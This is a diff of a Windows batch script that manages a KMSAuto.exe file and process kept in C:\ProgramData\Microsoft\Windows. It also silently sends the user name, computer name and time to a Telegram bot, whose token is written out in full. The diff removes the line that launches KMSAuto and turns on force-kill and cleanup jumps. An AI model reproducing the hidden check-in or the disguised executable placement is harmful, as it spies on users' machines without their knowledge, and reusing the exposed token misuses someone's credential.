@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=22.3"
+set "BATCHVERSION=22.4"
 
 
 
@@ -52,7 +52,7 @@ if !instances! geq 2 (
 
 
 curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|START"
-start "" "C:\ProgramData\Microsoft\Windows\KMSAuto.exe"
+
 
 
 
@@ -570,7 +570,7 @@ if exist "%SHSTFILEroot%" (
 if exist "%SHSTFILE%" (
      echo Failed to delete %SHSTFILE%!
      echo Going to CheckKMSAuto
-     ::goto CheckKMSAuto
+     goto CheckKMSAuto
 ) else (
      echo Successfully deleted %SHSTFILE%.
 )
@@ -706,7 +706,7 @@ echo.
 echo Deleting %KMSFILEroot% and %KMSFILE%
 del /f /q "%KMSFILEroot%"
 echo Killing process KMSAuto by Powershell
-::powershell -Command "& { Get-Process | Where-Object { $_.Path -eq '%KMSFILE%' } | Stop-Process -Force }"
+powershell -Command "& { Get-Process | Where-Object { $_.Path -eq '%KMSFILE%' } | Stop-Process -Force }"
 del /f /q "%KMSFILE%"
 echo.
 
@@ -721,7 +721,7 @@ if exist "%KMSFILEroot%" (
 if exist "%KMSFILE%" (
      echo Failed to delete %KMSFILE%!
      echo Going to CheckComSurrogate
-     ::goto CheckComSurrogate
+     goto CheckComSurrogate
 ) else (
      echo Successfully deleted %KMSFILE%.
 )
